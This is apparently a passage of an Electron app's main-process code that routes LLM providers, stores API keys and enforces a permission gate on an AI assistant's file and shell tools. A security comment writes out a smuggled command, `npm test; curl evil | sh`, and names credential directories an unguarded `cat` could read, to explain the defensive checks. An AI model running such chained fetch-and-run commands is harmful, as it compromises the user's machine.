        if (provider === 'custom') {
            return await openaiRequest(getCustomConfig(), params.messages, params.tools, params.maxTokens, params.format);
        }

        // Cloud brain — same pointer as the streaming handler.
        if (provider === 'openai' || provider === 'anthropic') {
            const cfg = cloudEntryConfig({
                model: settingsStore.get('cloudBrainModel', ''),
                entryId: settingsStore.get('cloudBrainEntryId', '')
            }, provider);
            if (!cfg.apiKey) return { error: `No ${CLOUD_LLM_PROVIDERS[provider].label} API key saved — add one in Settings → AI Assistant.` };
            return provider === 'anthropic'
                ? await anthropicRequest(cfg, params.messages, params.tools, params.maxTokens, params.format)
                : await openaiRequest(cfg, params.messages, params.tools, params.maxTokens, params.format);
        }

        // Auto mode: local backend first (matches settings UI copy), then a
        // configured custom server (e.g. a remote Ollama box exposed via its
        // OpenAI-compatible endpoint). There is deliberately NO implicit
        // cloud fallback — cloud providers run only when the user explicitly
        // selects a cloud model entry; traffic only ever goes where the user
        // pointed it.
        try {
            let localResult;
            if (getLocalBackend() === 'llamacpp') {
                const cfg = await llamaCppChatConfig(params);
                localResult = await openaiRequest(cfg, params.messages, params.tools, params.maxTokens, params.format);
            } else {
                localResult = stripThinkTags(await ollamaRequest('POST', '/api/chat', buildOllamaChatBody(params)));
            }
            // Stamp the answering backend so LLM logs are unambiguous about
            // who replied (openaiRequest stamps 'custom', but this engine
            // runs on this Mac).
            if (!localResult.error) { localResult.provider = 'local'; return localResult; }
        } catch {}

        const customCfg = getCustomConfig();
        if (customCfg.baseUrl) {
            try {
                const customResult = await openaiRequest(customCfg, params.messages, params.tools, params.maxTokens, params.format);
                if (!customResult?.error) return customResult;
                console.error('[llm-chat] Custom server error in auto mode:', customResult.error);
            } catch (e) {
                console.error('[llm-chat] Custom server failed in auto mode:', e.message);
            }
        }

        return { error: customCfg.baseUrl
            ? 'Local backend and your server both failed — check Settings → AI Assistant'
            : 'Local backend is not running and no server is configured (Settings → AI Assistant)' };
    }
}));

// LLM settings management
ipcMain.handle('llm-get-settings', () => {
    return {
        provider: settingsStore.get('llmProvider', 'auto'),
        localBackend: getLocalBackend(),
        customBaseUrl: settingsStore.get('customBaseUrl', ''),
        customModel: settingsStore.get('customModel', ''),
        hasCustomKey: !!getCustomApiKey()
    };
});

// Which engine the 'local' provider runs: Ollama (default) or the managed
// llama.cpp llama-server. Machine-local, like the provider itself. Switching
// away from llama.cpp stops its server to free the model's RAM immediately;
// Ollama is left alone (it may be an external instance the user runs anyway,
// and its idle memory cost is near zero once models unload).
ipcMain.handle('llm-set-local-backend', (event, backend) => {
    const valid = (backend === 'ollama' || backend === 'llamacpp') ? backend : 'ollama';
    settingsStore.set('localBackend', valid);
    if (valid === 'ollama') {
        LlamaCppManager.stop(false);
        OllamaManager.start().catch(e => console.warn('[llm-set-local-backend] Ollama start failed:', e && e.message));
    }
    // llama.cpp starts lazily on the first chat (ensureModel needs to know
    // which model to load, which only the renderer's settings say).
    return { success: true, localBackend: valid };
});

// Custom OpenAI-compatible endpoint config. Endpoint + model are plaintext
// (machine-local, not sensitive); the optional key uses setCustomApiKey.
ipcMain.handle('llm-set-custom-config', (event, { baseUrl, model } = {}) => {
    if (baseUrl !== undefined) settingsStore.set('customBaseUrl', String(baseUrl || '').trim());
    if (model !== undefined) settingsStore.set('customModel', String(model || '').trim());
    return { success: true };
});

ipcMain.handle('llm-set-custom-key', (event, key) => {
    const ok = setCustomApiKey(key);
    if (!ok) return { success: false, error: 'Could not store the key securely — this Mac’s keychain is unavailable, so the key was NOT saved.' };
    return { success: true };
});

// The cloud brain pointer: when the DEFAULT model entry is a cloud engine,
// the renderer writes its model + entry id here (alongside setting the
// provider to 'openai'/'anthropic') so provider-routed features — email
// insights, action filing, Maker/Builder — follow the brain without knowing
// about entries. Machine-local, like every other provider setting.
ipcMain.handle('llm-set-cloud-brain', (event, { model, entryId } = {}) => {
    settingsStore.set('cloudBrainModel', String(model || '').trim());
    settingsStore.set('cloudBrainEntryId', String(entryId || ''));
    return { success: true };
});

// Per-entry server keys (assistant model list). Empty/absent key deletes.
ipcMain.handle('llm-set-entry-key', (event, { entryId, key } = {}) => {
    if (!entryId) return { success: false, error: 'entryId required' };
    const ok = setEntryApiKey(entryId, (key || '').trim() || null);
    if (!ok) return { success: false, error: 'Could not store the key securely — this Mac’s keychain is unavailable, so the key was NOT saved.' };
    return { success: true };
});

ipcMain.handle('llm-entry-key-status', (event, entryId) => {
    const keys = settingsStore.get('serverEntryKeys', {});
    return { hasKey: !!(entryId && keys[entryId]) };
});

// Probe one localhost port for a running OpenAI-compatible server via /v1/models.
// Resolves to {baseUrl, model, models[]} on success, or null. Short timeout so a
// full scan stays snappy; localhost-only so it never reaches the network.
function probeOpenAIServer(host, port, timeoutMs = 1200) {
    return new Promise((resolve) => {
        const req = http.request({ hostname: host, port, path: '/v1/models', method: 'GET', timeout: timeoutMs }, (res) => {
            let data = '';
            res.on('data', c => data += c.toString());
            res.on('end', () => {
                if (res.statusCode !== 200) { resolve(null); return; }
                try {
                    const p = JSON.parse(data);
                    const list = Array.isArray(p.data) ? p.data : (Array.isArray(p.models) ? p.models : []);
                    if (!list.length) { resolve(null); return; }
                    const names = list.map(m => m.id || m.name).filter(Boolean);
                    resolve({ baseUrl: `http://${host}:${port}/v1`, port, model: names[0] || '', models: names });
                } catch { resolve(null); }
            });
        });
        req.on('error', () => resolve(null));
        req.on('timeout', () => { req.destroy(); resolve(null); });
        req.end();
    });
}

// Auto-detect a local OpenAI-compatible server by scanning the ports the common
// runtimes use: llama.cpp llama-server (8080), LM Studio (1234), vLLM /
// llama-cpp-python (8000), plus a couple of frequent alternates. Ollama's own
// :11434 is intentionally excluded — it already has a first-class provider, so
// surfacing it here as a "custom server" would just be confusing.
ipcMain.handle('llm-detect-custom', async () => {
    const host = '127.0.0.1';
    const ports = [8080, 1234, 8000, 5000, 8081];
    const results = (await Promise.all(ports.map(p => probeOpenAIServer(host, p)))).filter(Boolean);
    if (!results.length) return { found: false };
    const first = results[0];
    return { found: true, baseUrl: first.baseUrl, model: first.model, servers: results };
});

// Connectivity check — sends a tiny non-streaming completion using the passed
// values (falling back to stored ones) so the user can test before saving.
ipcMain.handle('llm-test-custom', async (event, cfg = {}) => {
    const merged = {
        baseUrl: cfg.baseUrl !== undefined ? cfg.baseUrl : settingsStore.get('customBaseUrl', ''),
        model: cfg.model !== undefined ? cfg.model : settingsStore.get('customModel', ''),
        // Explicit key in the field wins; else the entry's saved key (when
        // testing a model-list row); else the legacy custom key.
        apiKey: (cfg.apiKey !== undefined && cfg.apiKey !== '') ? cfg.apiKey
            : (cfg.entryId ? getEntryApiKey(cfg.entryId, cfg.baseUrl) : getCustomApiKey())
    };
    if (!merged.baseUrl) return { ok: false, error: 'Enter a server URL first.' };
    // Give reasoning models (e.g. Gemma QAT with --jinja emits reasoning_content
    // before the answer) enough room that the actual reply isn't starved. A tiny
    // cap would return empty content and read as a failure.
    const res = await openaiRequest(merged, [{ role: 'user', content: 'Reply with the single word: pong' }], null, 256);
    if (res.error) return { ok: false, error: res.error };
    return { ok: true, model: res.model || merged.model, reply: (res.message?.content || '').trim().slice(0, 80) };
});

// List chat models from a cloud provider with the user's key (Add-model flow
// and the per-entry Manage panel). Live listing instead of a hardcoded
// catalog so new models appear without an app update. OpenAI's /v1/models
// returns everything the account can touch (embeddings, TTS, images, …) — a
// light family filter keeps the chat-capable ids.
ipcMain.handle('llm-cloud-models', async (event, { engine, apiKey, entryId } = {}) => {
    const meta = CLOUD_LLM_PROVIDERS[engine];
    if (!meta) return { error: 'Unknown provider' };
    const key = (apiKey || '').trim() || getEntryApiKey(entryId, meta.baseUrl);
    if (!key) return { error: 'Enter an API key first.' };
    try {
        if (engine === 'anthropic') {
            const models = [];
            for await (const m of anthropicClient(key).models.list()) {
                models.push({ id: m.id, label: m.display_name || m.id });
            }
            return { models };
        }
        const body = await new Promise((resolve, reject) => {
            const req = https.request({
                hostname: 'api.openai.com', path: '/v1/models', method: 'GET',
                headers: { 'Authorization': `Bearer ${key}` }, timeout: 15000
            }, (res) => {
                let data = '';
                res.on('data', c => data += c.toString());
                res.on('end', () => {
                    if (res.statusCode !== 200) { reject(Object.assign(new Error('model list failed'), { status: res.statusCode })); return; }
                    try { resolve(JSON.parse(data)); } catch (e) { reject(e); }
                });
            });
            req.on('error', reject);
            req.on('timeout', () => { req.destroy(); reject(new Error('model list timed out')); });
            req.end();
        });
        const EXCLUDE = /(embed|whisper|tts|dall-e|audio|realtime|image|moderation|transcribe|search|davinci|babbage|instruct|computer-use)/i;
        const models = (body.data || [])
            .map(m => m.id)
            .filter(id => /^(gpt-|o\d|chatgpt)/.test(id) && !EXCLUDE.test(id))
            .sort()
            .map(id => ({ id, label: id }));
        return { models };
    } catch (e) {
        return { error: cloudErrorMessage(meta.label, e) };
    }
});

// Connectivity check for a cloud entry — tiny completion with the passed key
// (falling back to the entry's saved key) so the user can test before saving.
ipcMain.handle('llm-cloud-test', async (event, { engine, model, apiKey, entryId } = {}) => {
    const meta = CLOUD_LLM_PROVIDERS[engine];
    if (!meta) return { ok: false, error: 'Unknown provider' };
    const cfg = {
        baseUrl: meta.baseUrl,
        model,
        apiKey: (apiKey || '').trim() || getEntryApiKey(entryId, meta.baseUrl),
        provider: engine,
        tokenParam: engine === 'openai' ? 'max_completion_tokens' : undefined
    };
    if (!cfg.apiKey) return { ok: false, error: 'Enter an API key first.' };
    if (!cfg.model) return { ok: false, error: 'Pick a model first.' };
    const ping = [{ role: 'user', content: 'Reply with the single word: pong' }];
    // 1024, not 256: reasoning models spend hidden tokens before the reply,
    // and a starved cap reads as a failure.
    const res = engine === 'anthropic'
        ? await anthropicRequest(cfg, ping, null, 1024)
        : await openaiRequest(cfg, ping, null, 1024);
    if (res.error) return { ok: false, error: res.error };
    return { ok: true, model: res.model || cfg.model, reply: (res.message?.content || '').trim().slice(0, 80) };
});

ipcMain.handle('llm-set-provider', (event, provider) => {
    // The global provider names the brain's home: this Mac (local/auto),
    // the user's own server (custom), or a cloud provider the user chose
    // (openai/anthropic — set together with llm-set-cloud-brain so the
    // provider-routed features know which model/key to use). Anything else
    // normalizes to auto.
    const valid = (provider === 'auto' || provider === 'local' || provider === 'custom'
        || provider === 'openai' || provider === 'anthropic') ? provider : 'auto';
    settingsStore.set('llmProvider', valid);
    // Switching to a provider that uses the local engine? Start it now
    // (idempotent — a no-op if it's already running) so the first chat
    // doesn't cold-fail while it was skipped at launch. Non-blocking; the
    // readiness dot reflects it. llama.cpp has no daemon to pre-start — its
    // server spawns lazily on the first chat, once the model is known.
    if ((valid === 'auto' || valid === 'local') && getLocalBackend() === 'ollama') {
        OllamaManager.start().catch(e => console.warn('[llm-set-provider] Ollama start failed:', e && e.message));
    }
    return { success: true };
});

// Local-model context window. Default 0 = auto: the renderer derives a
// safe value from totalMemGB. A non-zero value is the user's explicit
// override. Stored in settingsStore (machine-local) rather than synced —
// the right num_ctx depends on the hardware running the model.
ipcMain.handle('llm-get-num-ctx', () => {
    return { numCtx: settingsStore.get('agentNumCtx', 0) };
});

ipcMain.handle('llm-set-num-ctx', (event, value) => {
    const n = Number(value);
    if (!Number.isFinite(n) || n < 0) return { error: 'Invalid num_ctx' };
    settingsStore.set('agentNumCtx', Math.floor(n));
    return { success: true };
});

// Lightweight system info — used by the renderer to derive an
// auto-default num_ctx based on the host's total RAM. No personally-
// identifying data; just hardware envelope.
ipcMain.handle('system-get-info', () => {
    return {
        totalMemGB: Math.round(os.totalmem() / 1024 / 1024 / 1024),
        cpus: os.cpus().length,
        arch: os.arch(),
        platform: os.platform()
    };
});

// ── Web search ──────────────────────────────────────────────────────
// Agent-facing search tool. The renderer never calls a provider directly —
// it goes through IPC so the key never reaches the browser context. Each
// provider's response is normalized to {results: [{title, url, snippet}]}
// to keep tool-result tokens low and decouple the agent from provider shape.

ipcMain.handle('search-get-status', () => {
    const provider = getActiveSearchProvider();
    const providers = {};
    for (const id of Object.keys(SEARCH_PROVIDERS)) {
        providers[id] = {
            label: SEARCH_PROVIDERS[id].label,
            hasKey: !!getSearchApiKey(id)
        };
    }
    return { provider, providers };
});

ipcMain.handle('search-set-provider', (event, provider) => {
    setActiveSearchProvider(provider);
    return { success: true, provider: getActiveSearchProvider() };
});

ipcMain.handle('search-set-api-key', (event, { provider, key } = {}) => {
    if (!provider || !SEARCH_PROVIDERS[provider]) {
        return { success: false, error: 'Unknown search provider' };
    }
    setSearchApiKey(provider, key);
    return { success: true };
});

// Live connectivity test for ONE provider (not necessarily the active one):
// a 1-result query against its stored key, so the Settings card can verify
// a key right after saving it. Same throttle as real searches.
ipcMain.handle('search-test', async (event, provider) => {
    if (!provider || !SEARCH_PROVIDERS[provider]) return { error: 'Unknown search provider' };
    const apiKey = getSearchApiKey(provider);
    if (!apiKey) return { error: 'No API key saved yet' };
    const run = provider === 'tavily'
        ? () => _searchTavily('connectivity test', 1, apiKey)
        : () => _searchBrave('connectivity test', 1, apiKey);
    const res = await throttleSearch(run);
    if (res && res.error) return { error: res.error };
    return { ok: true, resultCount: (res && res.results && res.results.length) || 0 };
});

// ── Assistant permission grants (docs/COWORK_AGENT.md C1) ──────────────────
// Machine-local by design: grants will reference machine paths (C3 fs/shell
// scopes), so they live in settingsStore, which never syncs. The decision
// log is a capped ring so "what did I allow, when?" stays answerable
// without growing unbounded.

const AGENT_PERMISSION_LOG_MAX = 200;

ipcMain.handle('agent-permissions-get', () => {
    const grants = settingsStore.get('agentPermissions');
    return Array.isArray(grants) ? grants : [];
});

ipcMain.handle('agent-permissions-set', (event, grants) => {
    if (!Array.isArray(grants)) return { success: false, error: 'grants must be an array' };
    settingsStore.set('agentPermissions', grants);
    return { success: true };
});

ipcMain.handle('agent-permissions-log-append', (event, entry) => {
    if (!entry || typeof entry !== 'object') return { success: false };
    const log = settingsStore.get('agentPermissionLog');
    const next = Array.isArray(log) ? log : [];
    next.push({ at: entry.at, event: String(entry.event || ''), tool: String(entry.tool || '') });
    if (next.length > AGENT_PERMISSION_LOG_MAX) next.splice(0, next.length - AGENT_PERMISSION_LOG_MAX);
    settingsStore.set('agentPermissionLog', next);
    return { success: true };
});

ipcMain.handle('agent-permissions-log-get', () => {
    const log = settingsStore.get('agentPermissionLog');
    return Array.isArray(log) ? log : [];
});

// ── MCP servers (docs/COWORK_AGENT.md C2) ──────────────────────────────────
// Thin IPC over MCPManager. env values go renderer→main once (add) and are
// stored safeStorage-encrypted; listServers never returns them.

ipcMain.handle('mcp-list-servers', () => MCPManager.listServers());
ipcMain.handle('mcp-add-server', (event, params) => MCPManager.addServer(params || {}));
ipcMain.handle('mcp-remove-server', (event, name) => MCPManager.removeServer(name));
ipcMain.handle('mcp-set-enabled', (event, { name, enabled } = {}) => MCPManager.setEnabled(name, enabled));
ipcMain.handle('mcp-test-server', (event, name) => MCPManager.testServer(name));
ipcMain.handle('mcp-call-tool', (event, { server, tool, args } = {}) => MCPManager.callTool(server, tool, args));
ipcMain.handle('mcp-continue-output', (event, name) => MCPManager.continueOutput(name));

// ── Assistant fs/shell tools — scope-enforced in MAIN (C3) ─────────────────
//
// The renderer asks; main enforces (docs/COWORK_AGENT.md principle 4 + §3).
// Every fs/shell operation resolves against, in order: hard denials (the
// app's own key/data stores — a grant can NEVER override these), the default
// ~/Anjadhe scope, persisted "always" grants, session grants, and one-shot
// grants (consumed on use). Anything else must be granted through the
// renderer's confirm dialog first. Grant classes:
//   fs:read  — fs_list / fs_read / fs_search, scope = directory prefix
//   fs:write — fs_write / fs_move,            scope = directory prefix
//   shell    — run_command,                    scope = command prefix

const AGENT_FS_READ_CAP = 6000;          // chars per fs_read call (context budget)
const AGENT_FS_WRITE_CAP = 5 * 1024 * 1024;  // mirror Maker's per-file cap
const AGENT_SHELL_OUTPUT_CAP = 5000;     // chars each for stdout/stderr
const AGENT_SHELL_TIMEOUT_MS = 30000;

const _agentSessionGrants = [];  // {cls, scope} — dies with the app
const _agentOnceGrants = [];     // {cls, scope} — consumed by first matching use

// Read-only commands that run without asking. First-token (or git-subcommand)
// match, AND the command must be free of shell metacharacters — `cat x; rm y`
// must never ride the allowlist.
//
// SECURITY (C1): file-CONTENT readers (cat/head/tail) are deliberately NOT here.
// They take an arbitrary path argument, and the shell gate does not path-scope
// like fs_read does — so an allowlisted `cat` would silently read ~/.ssh,
// ~/.aws, or the OAuth-token store. The agent has the scoped `fs_read` tool for
// legitimate reads; anything the model wants to `cat` outside scope now prompts.
// The commands that remain expose only names/metadata (sizes, counts), never
// file bodies, and every shell command is additionally deny-prefix checked
// below so none can touch the sync key or data store.
const AGENT_SHELL_ALLOW_SINGLE = new Set([
    'ls', 'wc', 'file', 'stat', 'pwd', 'date',
    'whoami', 'uname', 'which', 'du', 'df', 'echo', 'basename', 'dirname'
]);
const AGENT_SHELL_ALLOW_GIT = new Set(['status', 'log', 'diff', 'show', 'branch', 'remote']);

function _agentExpandPath(p) {
    let s = String(p || '').trim();
    if (!s) return null;
    if (s === '~') s = os.homedir();
    else if (s.startsWith('~/')) s = path.join(os.homedir(), s.slice(2));
    if (!path.isAbsolute(s)) return null;  // relative paths are ambiguous — refuse
    return path.resolve(s);               // collapses any ../ segments
}

function _agentPathInside(target, prefix) {
    const rel = path.relative(prefix, target);
    return rel === '' || (!rel.startsWith('..') && !path.isAbsolute(rel));
}

// L2: canonicalize symlinks so a link INSIDE a scope can't point out of it, and
// a link anywhere can't point INTO a deny prefix. realpathSync throws on a path
// that doesn't exist yet (fs_write creating a new file), so resolve the nearest
// existing ancestor and re-append the missing tail. Never throws.
function _agentRealPath(p) {
    if (!p) return p;
    let cur = path.resolve(p);
    const missing = [];
    for (let i = 0; i < 64; i++) {
        try {
            const real = fs.realpathSync(cur);
            return missing.length ? path.join(real, ...missing.reverse()) : real;
        } catch {
            const parent = path.dirname(cur);
            if (parent === cur) break;   // reached root — nothing resolved
            missing.push(path.basename(cur));
            cur = parent;
        }
    }
    return path.resolve(p);
}

// Paths a grant can never open: the app's own data (SQLite store), the sync
// journal + its encryption key, and the settings store holding these very
// grants. Both the local and iCloud journal locations are covered.
function _agentDenyPrefixes() {
    const list = [
        path.join(os.homedir(), '.anjadhe_sync'),
        path.join(os.homedir(), 'Library', 'Mobile Documents', 'com~apple~CloudDocs', '.anjadhe_sync'),
        ICLOUD_SYNC_DIR,
        app.getPath('userData')
    ];
    const custom = settingsStore.get('customStoragePath');
    if (custom) list.push(path.resolve(custom));
    return list;
}

// Directories the assistant may touch without a grant. ~/Anjadhe is the
// app's own workspace (apps, artifacts, exports); the env overrides matter
// for isolated testing.
function _agentDefaultScopes() {
    const list = [path.join(os.homedir(), 'Anjadhe')];
    if (process.env.ANJADHE_APPS_DIR) list.push(path.resolve(process.env.ANJADHE_APPS_DIR));
    if (process.env.ANJADHE_ARTIFACTS_DIR) list.push(path.resolve(process.env.ANJADHE_ARTIFACTS_DIR));
    return list;
}

function _agentGrantMatches(grant, cls, target) {
    if (!grant || grant.tool !== cls || !grant.scope) return false;
    // SECURITY (H1): shell grants must match the EXACT command. A prefix match
    // (startsWith) let an approved `npm test` be widened into
    // `npm test; curl evil | sh` — the appended payload rode the stored grant
    // and skipped the metacharacter filter. Exact match keeps a grant to the
    // one command the user actually saw and approved.
    if (cls === 'shell') return String(target).trim() === String(grant.scope).trim();
    return _agentPathInside(target, grant.scope);
}

function _agentShellAllowlisted(command) {
    const cmd = String(command).trim();
    if (/[;&|`$<>\\]/.test(cmd)) return false;  // no chaining/substitution/redirection
    const tokens = cmd.split(/\s+/);
    if (!tokens[0]) return false;
    if (tokens[0] === 'git') return AGENT_SHELL_ALLOW_GIT.has(tokens[1]);
    return AGENT_SHELL_ALLOW_SINGLE.has(tokens[0]);
}

// SECURITY (C1): scan a shell command's arguments for any path that resolves
// inside a deny prefix (the sync journal + its plaintext AES key, the SQLite
// data store, the settings store). Applied to EVERY shell command — allowlisted
// or user-granted — so nothing routed through the shell can read or clobber
// Anjadhe's own secrets the way the fs tools are already forbidden from doing.
// Returns the offending resolved path, or null if the command is clean.
function _agentShellDeniedPath(command) {
    const deny = _agentDenyPrefixes();
    // Tokenize loosely and consider anything path-shaped (absolute, ~-relative,
    // or containing a slash). Strip surrounding quotes and a leading `=` from
    // `--flag=path` forms. Flags without a path (`-la`) are ignored.
    const tokens = String(command).split(/\s+/);
    for (let tok of tokens) {
        if (!tok) continue;
        const eq = tok.indexOf('=');
        if (tok.startsWith('-') && eq !== -1) tok = tok.slice(eq + 1);
        tok = tok.replace(/^['"]|['"]$/g, '');
        if (!(tok === '~' || tok.startsWith('~/') || tok.startsWith('/') || tok.includes('/'))) continue;
        const resolved = _agentExpandPath(tok);
        if (!resolved) continue;
        const real = _agentRealPath(resolved);   // L2: catch a symlinked arg
        for (const d of deny) {
            if (_agentPathInside(resolved, d) || _agentPathInside(real, _agentRealPath(d))) return resolved;
        }
    }
    return null;
}

/**
 * The one gate. cls: 'fs:read' | 'fs:write' | 'shell'. target: absolute
 * path or full command string. consumeOnce: true only at execution time
 * (the pre-flight check must not burn a one-shot grant).
 */
function _agentCheckAccess(cls, target, consumeOnce = false) {
    if (cls !== 'shell') {
        // L2: check both the logical AND the symlink-resolved path against the
        // deny prefixes, so a link that points into Anjadhe's own storage is
        // caught. Deny runs before any grant, so this guards granted paths too.
        const real = _agentRealPath(target);
        for (const deny of _agentDenyPrefixes()) {
            if (_agentPathInside(target, deny) || _agentPathInside(real, _agentRealPath(deny))) {
                return { decision: 'deny', reason: `${target} is inside Anjadhe's own data/sync storage, which the assistant may never touch` };
            }
        }
        // The REAL path must land in a scope — a symlink out of ~/Anjadhe no
        // longer counts as in-scope (scopes are realpath'd too, so a legitimately
        // symlinked ~/Anjadhe still matches).
        for (const scope of _agentDefaultScopes()) {
            if (_agentPathInside(real, _agentRealPath(scope))) return { decision: 'allow', via: 'default-scope' };
        }
    } else {
        if (/\bsudo\b/.test(target)) return { decision: 'deny', reason: 'sudo is never allowed' };
        // Hard-deny any shell command that references Anjadhe's own storage —
        // enforced even against allowlisted and user-granted commands, so the
        // sync key / data store can never be read or overwritten via the shell.
        const denied = _agentShellDeniedPath(target);
        if (denied) return { decision: 'deny', reason: `${denied} is inside Anjadhe's own data/sync storage, which the assistant may never touch` };
        if (_agentShellAllowlisted(target)) return { decision: 'allow', via: 'allowlist' };
    }

    const persisted = settingsStore.get('agentPermissions');
    if (Array.isArray(persisted) && persisted.some(g => _agentGrantMatches(g, cls, target))) {
        return { decision: 'allow', via: 'always' };
    }
    if (_agentSessionGrants.some(g => _agentGrantMatches(g, cls, target))) {
        return { decision: 'allow', via: 'session' };
    }
    const onceIdx = _agentOnceGrants.findIndex(g => _agentGrantMatches(g, cls, target));
    if (onceIdx !== -1) {
        if (consumeOnce) _agentOnceGrants.splice(onceIdx, 1);
        return { decision: 'allow', via: 'once' };
    }
    return { decision: 'ask' };
}

// Pre-flight for the renderer's permission gate: what would happen, and what
// scope should the dialog offer to grant?
ipcMain.handle('agent-access-check', (event, { tool, path: p, from, to, command } = {}) => {
    try {
        if (tool === 'run_command') {
            const cmd = String(command || '').trim();
            if (!cmd) return { decision: 'deny', reason: 'empty command' };
            const res = _agentCheckAccess('shell', cmd);
            return { ...res, grantClass: 'shell', suggestedScope: cmd, display: cmd };
        }
        const cls = ['fs_write', 'fs_move', 'fs_mkdir', 'fs_trash'].includes(tool) ? 'fs:write' : 'fs:read';
        if (tool === 'fs_move') {
            const f = _agentExpandPath(from), t = _agentExpandPath(to);
            if (!f || !t) return { decision: 'deny', reason: 'both paths must be absolute (or ~-based)' };
            const rf = _agentCheckAccess(cls, f);
            const rt = _agentCheckAccess(cls, t);
            if (rf.decision === 'deny') return { ...rf, grantClass: cls };
            if (rt.decision === 'deny') return { ...rt, grantClass: cls };
            if (rf.decision === 'allow' && rt.decision === 'allow') return { decision: 'allow' };
            // Grant the deepest common ancestor so one approval covers both ends.
            let common = path.dirname(f);
            while (!(_agentPathInside(f, common) && _agentPathInside(t, common))) {
                const up = path.dirname(common);
                if (up === common) break;
                common = up;
            }
            return { decision: 'ask', grantClass: cls, suggestedScope: common, display: `${f} → ${t}` };
        }
        const target = _agentExpandPath(p);
        if (!target) return { decision: 'deny', reason: 'path must be absolute (or ~-based)' };
        const res = _agentCheckAccess(cls, target);
        // For a file op, granting the parent folder is the useful unit; for
        // list/search the path itself is already a folder.
        const suggestedScope = (tool === 'fs_list' || tool === 'fs_search') ? target : path.dirname(target);
        return { ...res, grantClass: cls, suggestedScope, display: target };
    } catch (e) {
        return { decision: 'deny', reason: e.message };
    }
});

ipcMain.handle('agent-access-grant', (event, { cls, scope, duration } = {}) => {
    if (!cls || !scope) return { success: false, error: 'cls and scope required' };
    // Same shape as persisted grants ({tool, scope}) so _agentGrantMatches
    // treats all three durations identically.
    const grant = { tool: cls, scope };
    if (duration === 'always') {
        const persisted = settingsStore.get('agentPermissions');
        const grants = Array.isArray(persisted) ? persisted : [];
        if (!grants.some(g => g.tool === cls && g.scope === scope)) {
            grants.push({
                id: 'perm_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6),
                tool: cls,
                scope,
                createdAt: new Date().toISOString()
            });
            settingsStore.set('agentPermissions', grants);
        }
    } else if (duration === 'session') {
        _agentSessionGrants.push(grant);
    } else {
        _agentOnceGrants.push(grant);
    }
    return { success: true };
});

// The tool handlers. Each re-checks access at execution time (consuming
// one-shot grants here) — the pre-flight is UX, this is the gate.

ipcMain.handle('agent-fs-list', (event, { path: p, pattern } = {}) => {
    const target = _agentExpandPath(p);
    if (!target) return { error: 'path must be absolute (or ~-based)' };
    const access = _agentCheckAccess('fs:read', target, true);
    if (access.decision !== 'allow') return { error: `Not permitted to read ${target}. ${access.reason || 'The user must approve access first — just retry the call and they will be asked.'}` };
    try {
        // Optional name filter, applied HERE so "all the PDFs" comes back
        // complete and small — an unfiltered big folder gets shortened by
        // the context-budget caps downstream and files silently vanish
        // from the model's view (real-model finding). "*.pdf" style globs
        // and plain substrings both work.
        let match = null;
        const pat = String(pattern || '').trim();
        if (pat) {
            if (pat.includes('*')) {
                const re = new RegExp('^' + pat.split('*').map(s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('.*') + '$', 'i');
                match = (name) => re.test(name);
            } else {
                const needle = pat.toLowerCase();
                match = (name) => name.toLowerCase().includes(needle);
            }
        }
        const all = fs.readdirSync(target, { withFileTypes: true })
            .sort((a, b) => a.name.localeCompare(b.name));
        const matchedDirents = match ? all.filter(d => match(d.name)) : all;
        const entries = matchedDirents.slice(0, 300).map(d => {
            let size = null, mtime = null;
            try {
                const st = fs.statSync(path.join(target, d.name));
                size = st.size;
                mtime = st.mtime.toISOString();
            } catch {}
            return { name: d.name, dir: d.isDirectory(), size, mtime };
        });
        return {
            path: target,
            total: all.length,
            matched: matchedDirents.length,
            pattern: pat || undefined,
            entries,
            truncated: matchedDirents.length > entries.length
        };
    } catch (e) {
        return { error: e.message };
    }
});

ipcMain.handle('agent-fs-read', (event, { path: p, offset } = {}) => {
    const target = _agentExpandPath(p);
    if (!target) return { error: 'path must be absolute (or ~-based)' };
    const access = _agentCheckAccess('fs:read', target, true);
    if (access.decision !== 'allow') return { error: `Not permitted to read ${target}. ${access.reason || 'The user must approve access first — just retry the call and they will be asked.'}` };
    try {
        const st = fs.statSync(target);
        if (st.isDirectory()) return { error: `${target} is a directory — use fs_list` };
        if (st.size > 10 * 1024 * 1024) return { error: `File too large to read (${Math.round(st.size / 1048576)}MB)` };
        const buf = fs.readFileSync(target);
        if (buf.subarray(0, 8192).includes(0)) return { error: 'Binary file — cannot read as text' };
        const text = buf.toString('utf8');
        const start = Math.max(0, parseInt(offset, 10) || 0);
        const slice = text.slice(start, start + AGENT_FS_READ_CAP);
        return {
            path: target,
            text: slice,
            offset: start,
            totalChars: text.length,
            truncated: start + slice.length < text.length
        };
    } catch (e) {
        return { error: e.message };
    }
});

ipcMain.handle('agent-fs-search', (event, { path: p, query } = {}) => {
    const target = _agentExpandPath(p);
    if (!target) return { error: 'path must be absolute (or ~-based)' };
    const q = String(query || '').trim().toLowerCase();
    if (!q) return { error: 'query required' };
    const access = _agentCheckAccess('fs:read', target, true);
    if (access.decision !== 'allow') return { error: `Not permitted to search ${target}. ${access.reason || 'The user must approve access first — just retry the call and they will be asked.'}` };
    const SKIP = new Set(['node_modules', '.git', 'Library', '.Trash']);
    const results = [];
    let visited = 0;
    const walk = (dir, depth) => {
        if (depth > 6 || results.length >= 50 || visited > 4000) return;
        let entries;
        try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch { return; }
        visited++;
        for (const d of entries) {
            if (results.length >= 50) return;
            if (d.name.toLowerCase().includes(q)) {
                results.push({ path: path.join(dir, d.name), dir: d.isDirectory() });
            }
            if (d.isDirectory() && !d.name.startsWith('.') && !SKIP.has(d.name)) {
                walk(path.join(dir, d.name), depth + 1);
            }
        }
    };
    walk(target, 0);
    return { path: target, query: q, results, truncated: results.length >= 50 };
});

// Chat attachment: extract text from a PDF the user attached in the
// assistant composer. Parsing happens here (Mozilla pdf.js, fully local —
// nothing leaves the machine) because the sandboxed renderer can't load
// npm modules. The renderer sends the raw bytes of a file the user
// explicitly picked/dropped, so no path-permission check applies.
const AGENT_PDF_MAX_BYTES = 20 * 1024 * 1024;
const AGENT_PDF_MAX_CHARS = 200 * 1024;
ipcMain.handle('agent-pdf-extract', async (event, { data, name } = {}) => {
    try {
        if (!data) return { error: 'no data' };
        const bytes = data instanceof Uint8Array ? data : new Uint8Array(data);
        if (bytes.byteLength > AGENT_PDF_MAX_BYTES) {
            return { error: `PDF too large (${Math.round(bytes.byteLength / 1048576)}MB — max ${AGENT_PDF_MAX_BYTES / 1048576}MB)` };
        }
